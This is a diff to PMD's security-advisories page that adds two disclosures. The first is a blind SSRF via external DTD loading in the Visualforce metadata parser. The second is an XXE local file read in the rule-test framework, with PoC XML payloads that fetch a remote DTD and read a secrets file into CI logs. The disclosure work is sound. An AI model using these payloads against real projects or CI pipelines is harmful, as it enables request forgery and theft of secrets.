@@ -8,6 +8,206 @@ last_updated: October 2026 (7.29.0)
 For reporting security issues, see [SECURITY.md](https://github.com/pmd/pmd/blob/main/SECURITY.md).
 
 ## Security Vulnerabilities
+### GHSA-wv72-2ccf-28gj
+**Published:** 2026-10-30
+
+**CVE:** requested
+
+**Severity:** Medium
+
+**Summary:** Blind SSRF through Visualforce metadata parser
+
+**Versions Affected:**
+* net.sourceforge.pmd:pmd-visualforce >= 6.30.0, <= 7.28.0
+
+**Description:**
+
+PMD’s Visualforce metadata parser reads Salesforce field metadata files to find out about custom field types.
+These metadata files are XML files and PMD parses them without disabling external DTD loading, so it fetches
+any external DTD a file references. A crafted metadata file can cause PMD to make a network request to an
+attacker-chosen URL during analysis.
+
+**Details:**
+
+* `ObjectFieldTypes` creates a `javax.xml.parsers.DocumentBuilder` and disables external general and parameter
+  entities, but does not disable external DTD loading (ObjectFieldTypes.java:105).
+* `ObjectFieldTypes.parseSfdxCustomField` parses field metadata and uses XPath expressions to query it
+  (ObjectFieldTypes.java:202).
+* The Visualforce parser reaches this code path through `VfExpressionTypeVisitor` (VfExpressionTypeVisitor.java:142).
+* The field metadata files are part of the analyzed source tree and are untrusted data.
+
+**PoC:**
+
+Setup: PMD 7.28.0 binary distribution. An SFDX project with a crafted `field-meta.xml` file.
+
+1. Create an empty file `probe.dtd`:
+```
+touch probe.dtd
+```
+
+2. Start a web server on 127.0.0.1:8000 in the directory containing `probe.dtd` in a second terminal:
+```
+jwebserver -p 8000
+```
+
+3. Create a small SFDX sample project to analyze:
+```
+mkdir -p objects/Account/fields
+cat > objects/Account/fields/Hit__c.field-meta.xml <<'EOF'
+<!DOCTYPE CustomField SYSTEM 'http://127.0.0.1:8000/probe.dtd'>
+<CustomField>
+  <fullName>Hit__c</fullName>
+  <type>Text</type>
+</CustomField>
+EOF
+
+mkdir -p pages
+cat > pages/page.page <<'EOF'
+<apex:page standardController="Account">
+  <apex:outputText value="{!Account.Hit__c}" escape="false"/>
+</apex:page>
+EOF
+```
+
+4. Execute PMD:
+```
+pmd check --no-progress --no-cache -d . -R category/visualforce/security.xml
+```
+
+5. Observe the request in the web server log:
+```
+127.0.0.1 - - [09/Oct/2026:15:31:38 +0200] "GET /probe.dtd HTTP/1.1" 200 -
+```
+
+This confirms blind external DTD network access.
+
+**Expected:** PMD should not load the remote DTD.
+
+**Actual:** PMD fetches the DTD over the network.
+
+**Impact:**
+
+CWE-827: Improper Control of Document Type Definition
+
+CWE-918: Server-Side Request Forgery (SSRF)
+
+This allows blind SSRF: an attacker can make PMD send requests to any URL reachable from the machine
+running it. This affects users who use PMD to analyze Visualforce code from untrusted sources,
+such as pull requests.
+
+**Fixes:**
+* See [#7261](https://github.com/pmd/pmd/pull/7261) \[core] Disallow external entity expansions/DTD in XML parsing
+
+**References:**
+* [GHSA-wv72-2ccf-28gj](https://github.com/pmd/pmd/security/advisories/GHSA-wv72-2ccf-28gj) - Blind SSRF through Visualforce metadata parser
+
+
+
+### GHSA-9hm5-r2r7-hjcq
+**Published:** 2026-10-30
+
+**CVE:** requested
+
+**Severity:** Medium
+
+**Summary:** Local file reads through XXE in PMD rule tests
+
+**Versions Affected:**
+* pmd:pmd >= 3.9
+* net.sourceforge.pmd:pmd-test <= 6.47.0
+* net.sourceforge.pmd:pmd-test-schema >= 6.48.0, <= 7.28.0
+
+**Description:**
+PMD provides a custom test framework for testing rules. The test cases are defined in an XML rule-tests file.
+`pmd-test-schema` parses these rule-tests XML files with external entities enabled. A crafted XML rule-tests
+file can cause the process running PMD rule tests to read a local file and place its contents in a parsed test
+description. This was reproduced against PMD’s actual parser.
+
+**Details:**
+
+* `TestSchemaParser.newDocumentBuilder` creates a new `javax.xml.parsers.DocumentBuilder` with schema validation
+  enabled, but it does not disable DTD parsing or external entities (TestSchemaParser.java:140-145).
+* `TestSchemaParser.parse` passes that `DocumentBuilder` instance and the supplied `InputSource` to
+  `OoxmlFacade.parse` (TestSchemaParser.java:81).
+* `RuleTst.parseTestXml` loads the XML rule-tests through this parser (RuleTst.java:338-346).
+* `RuleTst.toDynamicTest` uses the parsed test description as a JUnit dynamic test name (RuleTst.java:398-409).
+* This test name will be in the JUnit reports, creating a possible route for file contents to appear in test results.
+
+**PoC:**
+
+1. Create a file that should be read:
+```
+mkdir LOCAL_FILE
+printf 'AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY;\nDATABASE_PASSWORD = super_secret_prod_password_12345;\n' > LOCAL_FILE/secrets.txt
+```
+
+2. Check out PMD (this would be done by CI):
+```
+git clone --depth=1 --single-branch https://github.com/pmd/pmd.git
+```
+
+3. Replace a rule-tests XML file with malicious content (this would be done in the PR):
+```
+cat > pmd/pmd-apex/src/test/resources/net/sourceforge/pmd/lang/apex/rule/bestpractices/xml/ApexAssertionsShouldIncludeMessage.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test-data [<!ENTITY leak SYSTEM '../../../LOCAL_FILE/secrets.txt'>]>
+<test-data
+        xmlns="http://pmd.sourceforge.net/rule-tests"
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://pmd.sourceforge.net/rule-tests http://pmd.sourceforge.net/rule-tests_1_0_0.xsd">
+    <test-code>
+        <description>&leak;</description>
+        <expected-problems>1</expected-problems>
+        <code>public class Foo {}</code>
+    </test-code>
+
+    <!-- some more text, so that the file is longer than the injected description of the test case above. -->
+</test-data>
+EOF
+```
+
+4. Run the build with Maven:
+```
+pmd/mvnw -f pmd/pom.xml -PfastSkip \
+   -Dtest=ApexAssertionsShouldIncludeMessageTest \
+   -Dsurefire.failIfNoSpecifiedTests=false \
+  verify
+```
+
+5. The test failure shows the content of the local file:
+```
+[INFO] Running net.sourceforge.pmd.lang.apex.rule.bestpractices.ApexAssertionsShouldIncludeMessageTest
+--------------------------------------------------------------
+Test Failure: AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY;
+DATABASE_PASSWORD = super_secret_prod_password_12345;
+ -> Expected 1 problem(s), 0 problem(s) found.
+ -> Expected messages: []
+ -> Expected begin line numbers: []
+```
+
+Note: This can also be easily reproduced with the example project for custom rules at https://github.com/pmd/pmd-examples/tree/main/custom-rules/maven-java
+
+**Expected:** The test case is not executed, as it contains a reference to an externally defined entity.
+
+**Actual:** The test case is executed and reveals the content of a local file.
+
+**Impact:**
+
+CWE-611: Improper Restriction of XML External Entity Reference
+
+This affects projects that use PMD's test framework and parse untrusted rule-tests XML files. This includes,
+but is not limited to, PMD itself. Rule-testing jobs with access to files that the XML author cannot otherwise
+read are particularly at risk. The PoC confirms that a local file can be read into a test description and
+exfiltrated through the build logs. These logs are usually available through the CI output.
+
+**Fixes:**
+* See [#7261](https://github.com/pmd/pmd/pull/7261) \[core] Disallow external entity expansions/DTD in XML parsing
+
+**References:**
+* [GHSA-9hm5-r2r7-hjcq](https://github.com/pmd/pmd/security/advisories/GHSA-9hm5-r2r7-hjcq) - Local file reads through XXE in PMD rule tests
+
+
+
 ### GHSA-5x5v-644m-q2qc
 **Published:** 2026-10-30
 
@@ -128,11 +328,12 @@ analyze untrusted contributions and make HTML reports available to reviewers (e.
 Script access is limited by the origin and browser policy under which the report is opened.
 
 **Fixes:**
-* See [#PR TODO](https://github.com/pmd/pmd/pull/TODO) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl
+* See [#7260](https://github.com/pmd/pmd/pull/7260) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl
 
 **References:**
 * [CVE-2026-28338](https://github.com/advisories/GHSA-8rr6-2qw5-pc7r) - Stored XSS in HTML renderers via unescaped violation messages
-* [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c) - Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in summaryhtml report format
+* [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c) - XSS via rule name in summaryhtml report format
+* [GHSA-5x5v-644m-q2qc](https://github.com/pmd/pmd/security/advisories/GHSA-5x5v-644m-q2qc) - XSS via externalInfoUrl in HTML report formats
 
 
 
@@ -215,10 +416,10 @@ is served from a domain (a published CI dashboard, an internal report host), the
 act with the viewer's session there.
 
 **Fixes:**
-* See [#PR TODO](https://github.com/pmd/pmd/pull/TODO) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl
+* See [#7260](https://github.com/pmd/pmd/pull/7260) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl
 
 **References:**
-* [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c)
+* [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c) - XSS via rule name in summaryhtml report format
 
 
 
@@ -322,7 +523,7 @@ the runner that holds the secrets. Scanning untrusted source is the intended use
 *   See [#7259](https://github.com/pmd/pmd/pull/7259) \[core] Don't follow symlinks in FileCollector
 
 **References:**
-*   [GHSA-wj6q-xw9m-26p6](https://github.com/pmd/pmd/security/advisories/GHSA-wj6q-xw9m-26p6)
+*   [GHSA-wj6q-xw9m-26p6](https://github.com/pmd/pmd/security/advisories/GHSA-wj6q-xw9m-26p6) - Arbitrary file disclosure in CPD via symlinks in analyzed sources
 
 
 
